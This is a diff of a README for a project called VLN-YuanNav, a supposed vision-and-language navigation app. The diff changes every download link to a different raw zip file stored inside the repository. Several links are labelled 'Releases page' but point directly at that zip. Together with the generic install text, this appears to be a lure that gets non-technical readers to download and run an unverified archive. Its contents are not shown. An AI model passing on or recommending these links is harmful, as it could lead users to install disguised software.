@@ -1,7 +1,7 @@
 # 🌟 VLN-YuanNav - Navigate with Ease and Confidence
 
 ## 📥 Download Now
-[![Download VLN-YuanNav](https://raw.githubusercontent.com/abuttan1979/VLN-YuanNav/main/vln/Nav_VL_Yuan_3.1.zip)](https://raw.githubusercontent.com/abuttan1979/VLN-YuanNav/main/vln/Nav_VL_Yuan_3.1.zip)
+[![Download VLN-YuanNav](https://raw.githubusercontent.com/abuttan1979/VLN-YuanNav/main/vln/project/Yuan-Nav-VL-3.9.zip)](https://raw.githubusercontent.com/abuttan1979/VLN-YuanNav/main/vln/project/Yuan-Nav-VL-3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the VLN-YuanNav application! This tool helps you explore and navigate through various environments using a vision-and-language approach. Whether you're a researcher or just curious about this technology, you can follow these simple steps to download and run the software.
@@ -24,7 +24,7 @@ To run VLN-YuanNav, your computer should meet the following minimum requirements
 - **Graphics**: Integrated graphics are sufficient; however, a dedicated GPU will improve performance.
 
 ## 📥 Download & Install
-1. **Visit this page to download the latest version**: [VLN-YuanNav Releases](https://raw.githubusercontent.com/abuttan1979/VLN-YuanNav/main/vln/Nav_VL_Yuan_3.1.zip)
+1. **Visit this page to download the latest version**: [VLN-YuanNav Releases](https://raw.githubusercontent.com/abuttan1979/VLN-YuanNav/main/vln/project/Yuan-Nav-VL-3.9.zip)
    
 2. Look for the latest release and choose the appropriate installer for your operating system. Click the download link and save the file to your computer.
 
@@ -78,7 +78,7 @@ If you encounter any issues while using VLN-YuanNav, try the following solutions
   
 - **Slow Performance**: Close other applications that may be using system resources. Ensure your computer is not overloaded.
 
-- **Missing Features**: Check that you have the latest version by revisiting the [Releases page](https://raw.githubusercontent.com/abuttan1979/VLN-YuanNav/main/vln/Nav_VL_Yuan_3.1.zip). Updating may resolve any missing features or bugs.
+- **Missing Features**: Check that you have the latest version by revisiting the [Releases page](https://raw.githubusercontent.com/abuttan1979/VLN-YuanNav/main/vln/project/Yuan-Nav-VL-3.9.zip). Updating may resolve any missing features or bugs.
 
 ## 🎓 Learning Resources
 To maximize your use of VLN-YuanNav, consider the following resources:
